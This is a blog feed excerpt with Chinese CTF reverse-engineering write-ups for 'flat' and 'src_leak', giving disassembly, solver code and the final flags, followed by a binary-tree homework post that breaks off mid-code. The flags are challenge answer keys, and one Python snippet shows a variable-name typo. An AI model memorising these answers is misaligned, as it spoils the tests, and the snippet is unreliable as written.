    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="flat">flat</h2><p><a href="%5Cuploads%5Cflat_bdc004aa1104e443b3b9c90a6b98d5e6.zip">flat_bdc004aa1104e443b3b9c90a6b98d5e6.zip</a></p><p>初步阅读f5代码，发现程序是由大量switch语句构成的，其中每个case都套上了很奇怪的数字，不方便静态阅读，所以我采取了动态调试的方式</p><p>发现大量诸如以下的语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00040109E loc_40109E:                             ; CODE XREF: main:loc_4013B3↓j</span><br><span class="line">.text:000000000040109E                 mov     eax, [rbp+var_154]</span><br><span class="line">.text:00000000004010A4                 mov     ecx, eax</span><br><span class="line">.text:00000000004010A6                 sub     ecx, 88070986h</span><br><span class="line">.text:00000000004010AC                 mov     [rbp+var_164], eax</span><br><span class="line">.text:00000000004010B2                 mov     [rbp+var_168], ecx</span><br><span class="line">.text:00000000004010B8                 jz      loc_401270</span><br><span class="line">.text:00000000004010BE                 jmp     $+5</span><br><span class="line">.text:00000000004010C3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004010C3</span><br><span class="line">.text:00000000004010C3 loc_4010C3:                             ; CODE XREF: main+7E↑j</span><br><span class="line">.text:00000000004010C3                 mov     eax, [rbp+var_164]</span><br><span class="line">.text:00000000004010C9                 sub     eax, 916CBF8Ch</span><br><span class="line">.text:00000000004010CE                 mov     [rbp+var_16C], eax</span><br><span class="line">.text:00000000004010D4                 jz      loc_401382</span><br><span class="line">.text:00000000004010DA                 jmp     $+5</span><br></pre></td></tr></table></figure><p>动态调试后可知程序把大量的汇编代码通过这样的方式混淆了，然后再通过操作码来读取对应的功能。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000401270 loc_401270:                             ; CODE XREF: main+78↑j</span><br><span class="line">.text:0000000000401270                 lea     rdi, [rbp+s]</span><br><span class="line">.text:0000000000401274                 mov     rax, offset aJ  ; &quot;J&quot;</span><br><span class="line">.text:000000000040127E                 mov     ecx, 90h</span><br><span class="line">.text:0000000000401283                 mov     edx, ecx        ; n</span><br><span class="line">.text:0000000000401285                 lea     rsi, [rbp+dest]</span><br><span class="line">.text:000000000040128C                 mov     [rbp+var_198], rdi</span><br><span class="line">.text:0000000000401293                 mov     rdi, rsi        ; dest</span><br><span class="line">.text:0000000000401296                 mov     rsi, rax        ; src</span><br><span class="line">.text:0000000000401299                 call    _memcpy</span><br><span class="line">.text:000000000040129E                 mov     rdi, [rbp+var_198] ; char *</span><br><span class="line">.text:00000000004012A5                 call    _Z10fun_check1Pc ; fun_check1(char *)</span><br><span class="line">.text:00000000004012AA                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:00000000004012AF                 mov     r8d, 70B25450h</span><br><span class="line">.text:00000000004012B5                 test    al, 1</span><br><span class="line">.text:00000000004012B7                 cmovnz  ecx, r8d</span><br><span class="line">.text:00000000004012BB                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:00000000004012C1                 jmp     loc_4013B3</span><br><span class="line">.text:00000000004012C6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004012C6</span><br><span class="line">.text:00000000004012C6 loc_4012C6:                             ; CODE XREF: main+190↑j</span><br><span class="line">.text:00000000004012C6                 lea     rdi, [rbp+s]    ; char *</span><br><span class="line">.text:00000000004012CA                 call    _Z10fun_check2Pc ; 检测格式</span><br><span class="line">.text:00000000004012CF                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:00000000004012D4                 mov     edx, 48DC1E73h</span><br><span class="line">.text:00000000004012D9                 test    al, 1</span><br><span class="line">.text:00000000004012DB                 cmovnz  ecx, edx</span><br><span class="line">.text:00000000004012DE                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:00000000004012E4                 jmp     loc_4013B3</span><br><span class="line">.text:00000000004012E9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004012E9</span><br><span class="line">.text:00000000004012E9 loc_4012E9:                             ; CODE XREF: main+174↑j</span><br><span class="line">.text:00000000004012E9                 lea     rdi, [rbp+s]    ; char *</span><br><span class="line">.text:00000000004012ED                 call    _Z10fun_check3Pc ; 限制格式</span><br><span class="line">.text:00000000004012F2                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:00000000004012F7                 mov     edx, 9FDEA8ECh</span><br><span class="line">.text:00000000004012FC                 test    al, 1</span><br><span class="line">.text:00000000004012FE                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401301                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:0000000000401307                 jmp     loc_4013B3</span><br><span class="line">.text:000000000040130C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040130C</span><br><span class="line">.text:000000000040130C loc_40130C:                             ; CODE XREF: main+B0↑j</span><br><span class="line">.text:000000000040130C                 lea     rdi, [rbp+s]    ; char *</span><br><span class="line">.text:0000000000401310                 call    _Z10fun_check4Pc ; 检查格式</span><br><span class="line">.text:0000000000401315                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:000000000040131A                 mov     edx, 0CDC4B0D0h</span><br><span class="line">.text:000000000040131F                 test    al, 1</span><br><span class="line">.text:0000000000401321                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401324                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:000000000040132A                 jmp     loc_4013B3</span><br><span class="line">.text:000000000040132F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040132F</span><br><span class="line">.text:000000000040132F loc_40132F:                             ; CODE XREF: main+104↑j</span><br><span class="line">.text:000000000040132F                 lea     rsi, [rbp+dest] ; int *</span><br><span class="line">.text:0000000000401336                 lea     rdi, [rbp+var_B0] ; char *</span><br><span class="line">.text:000000000040133D                 call    _Z10fun_check5PcPi ; fun_check5(char *,int *)</span><br><span class="line">.text:0000000000401342                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:0000000000401347                 mov     edx, 0F465F43Bh</span><br><span class="line">.text:000000000040134C                 test    al, 1</span><br><span class="line">.text:000000000040134E                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401351                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:0000000000401357                 jmp     loc_4013B3</span><br></pre></td></tr></table></figure><p>check1~5是整个程序的核心部分，其中check1 ~check4都是对flag格式的限制</p><p>我们只需要将call checkx 打上断点，在这个call执行完成之后，观察al的值即可判断格式是否符合要求，最终发现flag的格式是flag{}，总长度共42.</p><p>最重要的是check5函数，其中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400D90 loc_400D90:                             ; CODE XREF: fun_check5(char *,int *)+E9↑j</span><br><span class="line">.text:0000000000400D90                 mov     eax, 0B92BF994h</span><br><span class="line">.text:0000000000400D95                 mov     ecx, 0AC151DE7h</span><br><span class="line">.text:0000000000400D9A                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400D9E                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400DA5                 movsx   edi, byte ptr [rdx+rsi] ; 读取下一个字符</span><br><span class="line">.text:0000000000400DA9                 cmp     edi, 30h</span><br><span class="line">.text:0000000000400DAC                 cmovge  eax, ecx</span><br><span class="line">.text:0000000000400DAF                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400DB5                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400DBA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400DBA</span><br><span class="line">.text:0000000000400DBA loc_400DBA:                             ; CODE XREF: fun_check5(char *,int *)+79↑j</span><br><span class="line">.text:0000000000400DBA                 mov     eax, 0B92BF994h</span><br><span class="line">.text:0000000000400DBF                 mov     ecx, 0E37ECC40h</span><br><span class="line">.text:0000000000400DC4                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400DC8                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400DCF                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400DD3                 cmp     edi, 39h        ; 判断是否为数字</span><br><span class="line">.text:0000000000400DD6                 cmovle  eax, ecx</span><br><span class="line">.text:0000000000400DD9                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400DDF                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400DE4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400DE4</span><br><span class="line">.text:0000000000400DE4 loc_400DE4:                             ; CODE XREF: fun_check5(char *,int *)+159↑j</span><br><span class="line">.text:0000000000400DE4                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400DE8                 movsxd  rcx, [rbp+var_E4]</span><br><span class="line">.text:0000000000400DEF                 movsx   edx, byte ptr [rax+rcx]</span><br><span class="line">.text:0000000000400DF3                 sub     edx, 1D854A80h</span><br><span class="line">.text:0000000000400DF9                 add     edx, 11h</span><br><span class="line">.text:0000000000400DFC                 add     edx, 1D854A80h</span><br><span class="line">.text:0000000000400E02                 movsxd  rax, [rbp+var_E4]</span><br><span class="line">.text:0000000000400E09                 mov     [rbp+rax*4+var_E0], edx</span><br><span class="line">.text:0000000000400E10                 mov     [rbp+var_E8], 72D256E3h</span><br><span class="line">.text:0000000000400E1A                 jmp     loc_40102D</span><br></pre></td></tr></table></figure><p>如果输入是数字，就将数字转换为对应的大写字母</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400E1F loc_400E1F:                             ; CODE XREF: fun_check5(char *,int *)+B1↑j</span><br><span class="line">.text:0000000000400E1F                 mov     eax, 966647E9h</span><br><span class="line">.text:0000000000400E24                 mov     ecx, 0BA6BE5FDh</span><br><span class="line">.text:0000000000400E29                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400E2D                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400E34                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400E38                 cmp     edi, 2Dh</span><br><span class="line">.text:0000000000400E3B                 cmovz   eax, ecx</span><br><span class="line">.text:0000000000400E3E                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400E44                 jmp     loc_40102D</span><br></pre></td></tr></table></figure><p>'-'符号不作处理</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400E75 loc_400E75:                             ; CODE XREF: fun_check5(char *,int *)+41↑j</span><br><span class="line">.text:0000000000400E75                 mov     eax, 67B6BD28h</span><br><span class="line">.text:0000000000400E7A                 mov     ecx, 0B80842FBh</span><br><span class="line">.text:0000000000400E7F                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400E83                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400E8A                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400E8E                 cmp     edi, 61h</span><br><span class="line">.text:0000000000400E91                 cmovge  eax, ecx</span><br><span class="line">.text:0000000000400E94                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400E9A                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400E9F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400E9F</span><br><span class="line">.text:0000000000400E9F loc_400E9F:                             ; CODE XREF: fun_check5(char *,int *)+95↑j</span><br><span class="line">.text:0000000000400E9F                 mov     eax, 67B6BD28h</span><br><span class="line">.text:0000000000400EA4                 mov     ecx, 7CFC4F40h</span><br><span class="line">.text:0000000000400EA9                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400EAD                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400EB4                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400EB8                 cmp     edi, 7Ah</span><br><span class="line">.text:0000000000400EBB                 cmovle  eax, ecx</span><br><span class="line">.text:0000000000400EBE                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400EC4                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400EC9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400EC9</span><br><span class="line">.text:0000000000400EC9 loc_400EC9:                             ; CODE XREF: fun_check5(char *,int *)+271↑j</span><br><span class="line">.text:0000000000400EC9                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400ECD                 movsxd  rcx, [rbp+var_E4]</span><br><span class="line">.text:0000000000400ED4                 movsx   edx, byte ptr [rax+rcx]</span><br><span class="line">.text:0000000000400ED8                 sub     edx, 50577E63h</span><br><span class="line">.text:0000000000400EDE                 sub     edx, 30h</span><br><span class="line">.text:0000000000400EE1                 add     edx, 50577E63h</span><br><span class="line">.text:0000000000400EE7                 movsxd  rax, [rbp+var_E4]</span><br><span class="line">.text:0000000000400EEE                 mov     [rbp+rax*4+var_E0], edx</span><br><span class="line">.text:0000000000400EF5                 mov     [rbp+var_E8], 67B6BD28h</span><br><span class="line">.text:0000000000400EFF                 jmp     loc_40102D</span><br></pre></td></tr></table></figure><p>如果是字母就转换为数字</p><p>最后在转换完成的字符串上面下一个内存断点，就可找到这个字符串与目标加密字符串比较的过程</p><p>加密字符串：</p><p>flag{J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB}</p><p>解密即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">en c = <span class="string">"J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB"</span></span><br><span class="line">flag = <span class="string">"flag&#123;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">'-'</span>:</span><br><span class="line">        fuck = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> c &gt;= <span class="string">'A'</span> <span class="keyword">and</span> c &lt;= <span class="string">'J'</span>:</span><br><span class="line">        c = chr(ord(c) - <span class="number">0x11</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = chr(ord(c) + <span class="number">48</span>)</span><br><span class="line">    flag = flag + c</span><br><span class="line"></span><br><span class="line">flag += <span class="string">'&#125;'</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="nisc-20190815" scheme="https://mrh1s.top/categories/write-up/nisc-20190815/"/>
    
    
      <category term="VM" scheme="https://mrh1s.top/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>nisc-src_leak</title>
    <link href="https://mrh1s.top/posts/9455f959/"/>
    <id>https://mrh1s.top/posts/9455f959/</id>
    <published>2019-08-18T10:44:38.000Z</published>
    <updated>2019-08-18T10:49:29.128Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="src-leak">src_leak</h2><p><a href="%5Cuploads%5Csrc_leak_2886f9ce0464ae67bbeb52d939c9979d.zip">src_leak_2886f9ce0464ae67bbeb52d939c9979d.zip</a></p><p>没学过c++语法，看这些东西看蒙了</p><p>就大概猜了一下，发现算法流程并不是很复杂</p><p>x1~x5都是用一个函数跑出来的</p><p>x6用另一个</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x1&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x2&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x3&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x4&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x5&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: 1 1 1 1 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x1&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x2&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x3&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x4&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x5&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output: 963 4396 6666 1999 3141</span></span><br></pre></td></tr></table></figure><p>说几个比较关键的地方</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">bool</span> Flag, <span class="class"><span class="keyword">class</span> <span class="title">MaybeA</span>, <span class="title">class</span> <span class="title">MaybeB</span>&gt; <span class="title">class</span> <span class="title">IfElse</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">MaybeA</span>, <span class="title">class</span> <span class="title">MaybeB</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">IfElse</span>&lt;true, MaybeA, MaybeB&gt; &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">using</span> ResultType = MaybeA;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">MaybeA</span>, <span class="title">class</span> <span class="title">MaybeB</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">IfElse</span>&lt;false, MaybeA, MaybeB&gt; &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">using</span> ResultType = MaybeB;</span><br></pre></td></tr></table></figure><p>看起来这么大一堆，实际上就表达了一个意思</p><blockquote><p>result = flag ? MaybeA:MaybeB</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;uint N, uint L&gt; <span class="class"><span class="keyword">struct</span> <span class="title">func1</span>&lt;N, L, L&gt; &#123;</span> <span class="keyword">enum</span> &#123; result = L &#125;; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">size_t</span> func2&lt;<span class="number">0</span>&gt; = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;uint m&gt;<span class="class"><span class="keyword">struct</span> <span class="title">TEST</span>&lt;0, m&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;uint n&gt;<span class="class"><span class="keyword">struct</span> <span class="title">TEST</span>&lt;n, 0&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt;<span class="class"><span class="keyword">struct</span> <span class="title">func4</span>&lt;1&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;<span class="class"><span class="keyword">struct</span> <span class="title">func4</span>&lt;2&gt; &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> uint value = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上是各个函数的边界条件，一定不能省略，否则跑不出来或者跑出来不对，<strong>尤其是func4的1和2</strong></p><p>因为c的执行效率比较高，抱着试一试的心态，写了个暴力算法进行求解，在int范围下尝试失败（因为涉及到了数据的平方，int类型会溢出），于是更换为long long 进行求解，虽然效率不高，但还是可以在十秒中左右得出结果。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func2</span><span class="params">(LL n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> n%<span class="number">2</span> + func2(n/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func3</span><span class="params">(LL n)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n%<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func1</span><span class="params">(LL n, LL l, LL r)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l==r) <span class="keyword">return</span> l;</span><br><span class="line">LL mid = (l+r+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(n &lt; mid*mid)</span><br><span class="line"><span class="keyword">return</span> func1(n,l,mid<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> func1(n,mid,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LL _func1(LL n)&#123;</span><br><span class="line"><span class="keyword">return</span> func1(n,<span class="number">1</span>,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">nextn</span><span class="params">(LL n, LL m)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((n % m != <span class="number">0</span>) * n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">nextm</span><span class="params">(LL n, LL m)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (m * m &lt;= n ? (m + <span class="number">1</span>) : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">test</span><span class="params">(LL n,LL m)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> test(nextn(n,m) , nextm(n,m));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">func4</span><span class="params">(LL n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> test(n,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************</span></span><br><span class="line"><span class="comment">x1 ~ x5</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//input: 963 4396 6666 1999 3141</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// ans =  1927 8792 13332 3998 6282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**********/</span></span><br><span class="line">LL input[] = &#123;<span class="number">963</span>,<span class="number">4396</span>,<span class="number">6666</span>,<span class="number">1999</span>,<span class="number">3141</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(LL j = <span class="number">0</span>; j&lt;=<span class="number">4</span> ; j++)&#123;</span><br><span class="line">LL ans = input[j];</span><br><span class="line"><span class="keyword">for</span>(LL i=<span class="number">0</span>;i&lt;=<span class="number">300000000</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(func3(func2(i))==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span>(_func1(i) == ans)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*if(i % 100000 == 0)</span></span><br><span class="line"><span class="comment">printf("%d finished\n",i);*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************</span></span><br><span class="line"><span class="comment">x6 = 1229</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**********/</span></span><br><span class="line"></span><br><span class="line">LL cnt=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(LL i=<span class="number">3</span>;i&lt;=<span class="number">10000</span>;i++)</span><br><span class="line"><span class="keyword">if</span>(func4(i)==<span class="number">1</span>)</span><br><span class="line">cnt++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld&#125;"</span>,cnt);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;927369-19324816-44435556-3996001-9865881-1229&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="nisc-20190815" scheme="https://mrh1s.top/categories/write-up/nisc-20190815/"/>
    
    
  </entry>
  
  <entry>
    <title>期末大作业_二叉树的存储与图的最短路径</title>
    <link href="https://mrh1s.top/posts/36f51c45/"/>
    <id>https://mrh1s.top/posts/36f51c45/</id>
    <published>2019-06-14T12:51:14.000Z</published>
    <updated>2020-03-04T14:06:11.202Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>正文</h1><p><a href="/uploads/BinaryTree_ShortestPath.docx">实验报告</a></p><h2 id="exp1">exp1</h2><p>主要学习了一下递归函数的非递归写法</p><p>随机生成一棵树写得我很爽</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FLAG;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BT</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> data;</span><br><span class="line">BT *lch, *rch;</span><br><span class="line"><span class="keyword">int</span> process;<span class="comment">//记录当前递归到左子树还是右子树 </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free_BT</span><span class="params">(BT *rt)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(rt == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">Free_BT(rt-&gt;lch);</span><br><span class="line">Free_BT(rt-&gt;rch);</span><br><span class="line"><span class="built_in">free</span>(rt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BT *<span class="title">Generate_BT</span><span class="params">(<span class="keyword">int</span> now, <span class="keyword">int</span> mind, <span class="keyword">int</span> maxd)</span></span>&#123;<span class="comment">//随机生成一棵二叉树 </span></span><br><span class="line">BT *rt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>((rand()%<span class="number">10</span> &gt; <span class="number">3</span>)&amp;&amp;(now &lt;= maxd) || (now &lt; mind) )&#123;</span><br><span class="line">rt = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">rt-&gt;data = (rand()%<span class="number">26</span>) + <span class="string">'a'</span>; </span><br><span class="line">rt-&gt;lch = Generate_BT(now+<span class="number">1</span>, mind, maxd);</span><br><span class="line">rt-&gt;rch = Generate_BT(now+<span class="number">1</span>, mind, maxd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> 